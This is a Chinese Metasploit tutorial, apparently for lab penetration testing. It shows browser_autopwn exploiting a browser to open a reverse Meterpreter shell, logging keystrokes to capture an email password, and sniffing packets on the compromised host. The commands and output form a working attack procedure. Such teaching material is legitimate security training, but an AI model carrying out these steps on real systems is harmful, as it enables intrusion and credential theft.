### 披露日期与等级
**描述**  
`auxiliary/server/browser_autopwn` 是一个用于 HTTP 客户端的自动攻击模块。

### 使用 `browser_autopwn` 模块
1. **加载模块**:
   ```bash
   msf > use auxiliary/server/browser_autopwn
   ```
   执行上述命令后，没有任何信息输出。

2. **设置 payload**:
   ```bash
   msf auxiliary(browser_autopwn) > set payload windows/meterpreter/reverse_tcp
   ```
   设置成功后，会显示：
   ```bash
   payload => windows/meterpreter/reverse_tcp
   ```

3. **查看 payload 选项**:
   ```bash
   msf auxiliary(browser_autopwn) > show options
   ```
   输出如下：
   ```plaintext
   Module options (auxiliary/server/browser_autopwn):
     Name            Current Setting  Required  Description
     LHOST           192.168.41.234  yes       The IP address to use for reverse-connect payloads
     SRVHOST         0.0.0.0         yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
     SRVPORT         8080            yes       The local port to listen on.
     SSL             false           no        Negotiate SSL for incoming connections
     SSLCert         no              Path to a custom SSL certificate (default is randomly generated)
     SSLVersion      SSL3            no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
     URIPATH         no              The URI to use for this exploit (default is random)
   ```

4. **配置 LHOST 选项**:
   ```bash
   msf auxiliary(browser_autopwn) > set LHOST 192.168.41.234
   LHOST => 192.168.41.234
   ```

5. **配置 URIPATH 选项**:
   ```bash
   msf auxiliary(browser_autopwn) > set URIPATH filetypes
   URIPATH => filetypes
   ```

6. **启用渗透攻击**:
   ```bash
   msf auxiliary(browser_autopwn) > exploit
   ```
   输出信息如下：
   ```plaintext
   [*] Auxiliary module execution completed
   [*] Setup
   [*] Obfuscating initial javascript 2014-04-30 19:00:49 +0800
   [*] Done in 0.718574284 seconds
   [*] Starting exploit modules on host 192.168.41.234.
   [*] Using URL: http://0.0.0.0:8080/BjlwyiXpeQHIG
   [*] Local IP: http://192.168.41.234:8080/BjlwyiXpeQHIG
   [*] Server started.
   [*] Starting exploit multi/browser/java_jre17_jmxbean with payload java/meterpreter/reverse_tcp
   [*] Using URL: http://0.0.0.0:8080/NVVrXNZ
   [*] Local IP: http://192.168.41.234:8080/NVVrXNZ
   [*] Server started.
   ...省略部分内容...
   [*] Started reverse handler on 192.168.41.234:6666
   [*] Started reverse handler on 192.168.41.234:7777
   [*] Starting the payload handler...
   [*] --- Done, found 16 exploit modules
   [*] Using URL: http://0.0.0.0:8080/filetypes
   [*] Local IP: http://192.168.41.234:8080/filetypes
   [*] Server started.
   [*] 192.168.41.146 browser_autopwn - Handling 'filetypes'
   [*] 192.168.41.146 browser_autopwn - Handling 'filetypes' 2014-04-30 19:16:54 +0800
   [+] Sending stage (769024 bytes) to 192.168.41.146
   [*] SessionID 1 (192.168.41.234:3333 -> 192.168.41.146:1071) processing
   InitialAutoRunScript 'migrate -f'
   [+] Successfully migrated to process
   [*] Current server process: qjRc.exe (1824)
   [*] Spawning notepad.exe process to migrate to
   [+] Migrating to 1260
   ```

7. **激活会话**:
   ```bash
   msf auxiliary(browser_autopwn) > sessions -i 1
   [*] Starting interaction with 1..
   meterpreter >
   ```

8. **查看 Meterpreter 命令列表**:
   ```bash
   meterpreter > help
   ```
   输出信息如下：
   ```plaintext
   Core Commands
   Command                Description
   ?                      Help menu
   background             Backgrounds the current session
   bgkill                 Kills a background meterpreter script
   bglist                 Lists running background scripts
   bgrun                  Executes a meterpreter script as a background thread
   channel                Displays information about active channels
   close                  Closes a channel
   disable_unicode_encoding Disables encoding of unicode strings
   enable_unicode_encoding Enables encoding of unicode strings
   exit                   Terminate the meterpreter session
   help                   Help menu
   info                   Displays information about a Post module
   interact               Interacts with a channel
   irb                    Drop into irb scripting mode
   load                   Load one or more meterpreter extensions
   migrate                Migrate the server to another process
   quit                   Terminate the meterpreter session
   read                   Reads data from a channel
   resource               Run the commands stored in a file
   run                    Executes a meterpreter script or Post module
   use                    Deprecated alias for 'load'
   write                  Writes data to a channel

   Stdapi: Networking Commands
   Command                Description
   arp                    Display the host ARP cache
   getproxy               Display the current proxy configuration
   ifconfig               Display interfaces
   ipconfig               Display interfaces
   netstat                Display the network connections
   portfwd                Forward a local port to a remote service
   route                  View and modify the routing table

   Stdapi: System Commands
   Command                Description
   clearev                Clear the event log
   drop_token             Relinquishes any active impersonation token.
   execute                Execute a command
   getenv                 Get one or more environment variable values
   getpid                 Get the current process identifier
   getprivs               Attempt to enable all privileges available to the current process
   getuid                 Get the user that the server is running as
   kill                   Terminate a process
   ps                     List running processes
   reboot                 Reboots the remote computer
   reg                    Modify and interact with the remote registry
   rev2self               Calls RevertToSelf() on the remote machine
   shell                  Drop into a system command shell
   shutdown               Shuts down the remote computer
   steal_token            Attempts to steal an impersonation token from the target process
   suspend                Suspends or resumes a list of processes
   sysinfo                Gets information about the remote system, such as OS

   Stdapi: User interface Commands
   Command                Description
   enumdesktops           List all accessible desktops and window stations
   getdesktop             Get the current meterpreter desktop
   idletime               Returns the number of seconds the remote user has been idle
   keyscan_dump           Dump the keystroke buffer
   keyscan_start          Start capturing keystrokes
   keyscan_stop           Stop capturing keystrokes
   screenshot             Grab a screenshot of the interactive desktop
   setdesktop             Change the meterpreter's current desktop
   uictl                  Control some of the user interface components

   Priv: Timestomp Commands
   Command                Description
   timestomp              Manipulate file MACE attributes
   ```

9. **启动键盘输入捕获**:
   ```bash
   meterpreter > keyscan_start
   [*] Starting the keystroke sniffer..
   ```

10. **获取键盘输入信息**:
    ```bash
    meterpreter > keyscan_dump
    [*] Dumping captured keystrokes...
    mail.qq.com
    123456
    ```
    登录的邮箱地址为 `1234567891`，密码为 `123456`。

### 在 Metasploit 中捕获数据包
在 Metasploit 中，通过使用模块进行渗透攻击可以获取到一个 Meterpreter Shell。在 Meterpreter Shell 中，可以捕获目标系统中的数据包。下面将介绍如何在 Metasploit 中捕获数据包。

1. **确定活跃会话**:
   ```bash
   msf exploit(handler) > exploit
   [*] Started reverse handler on 192.168.6.103:4444
   [*] Starting the payload handler..
   [*] Sending stage (769536 bytes) to 192.168.6.110
   [*] Meterpreter session 1 opened (192.168.6.103:4444 -> 192.168.6.110:2478) at 2014-07-17 10:44:47 +0800
   meterpreter>
   ```

2. **查看 packetrecorder 命令的参数**:
   ```bash
   meterpreter > run packetrecorder
   Meterpreter Script for capturing packets into a PCAP file on a target host given an interface ID.
   OPTIONS:
   -h  Help menu.
   -i  Interface ID number where all packet capture will be done.
   -d  Specify an alternate folder to save PCAP file
   -li List interfaces that can be used for capture.
   -t  Time interval in seconds between recollection of packet, default 30 seconds.
   ```

3. **查看可用的捕获网络接口**:
   ```bash
   meterpreter > run packetrecorder -li
   1 - "VMware Accelerated AMD PCNet Adapter (type:0 mtu:1514 usable:true dhcp:true wifi:false)"
   ```

4. **指定捕获接口并开始捕获数据**:
   ```bash
   meterpreter > run packetrecorder -i 1 -d /root/Desktop
   [*] Starting Packet capture on interface 1
   [+] Packet capture started
   20140717.2700/AA-886OKJM26FSW_20140717.5608.cap
   [*] Packet capture interval is 30 Seconds
   ^C
   [*] Interrupt
   [+] Stopping Packet sniffer...
   ```

### 使用 Wireshark 打开捕获文件
在 Kali Linux 中，默认已经安装了 Wireshark 工具。

1. **启动 Wireshark**:
   ```bash
   root@kali:~# wireshark &
   ```
   或者在图形界面依次选择“应用程序” -> “Kali Linux Top 10 Security Tools” -> “Wireshark”，将显示警告信息。

2. **单击“确定”按钮**:
   显示 Wireshark 主界面。

3. **打开捕获文件**:
   在菜单栏中依次选择 File -> Open，选择要打开的捕获文件。打开捕获文件后的界面如图所示。

希望这些步骤和信息能帮助你更好地理解和使用 Metasploit 和 Wireshark 进行渗透测试和数据包分析。